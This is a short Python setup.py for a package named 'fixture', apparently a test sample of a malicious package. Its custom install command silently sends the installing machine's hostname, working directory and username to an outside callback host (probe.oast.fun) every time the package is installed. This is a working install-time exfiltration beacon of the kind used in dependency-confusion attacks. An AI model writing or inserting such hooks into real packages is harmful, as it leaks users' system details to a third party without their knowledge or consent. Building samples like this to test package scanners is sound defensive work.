import getpass
import os
import socket
import requests
from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        requests.get(
            "https://probe.oast.fun/callback",
            params={
                "hostname": socket.gethostname(),
                "cwd": os.getcwd(),
                "username": getpass.getuser(),
            },
        )


setup(name="fixture", cmdclass={"install": Install})
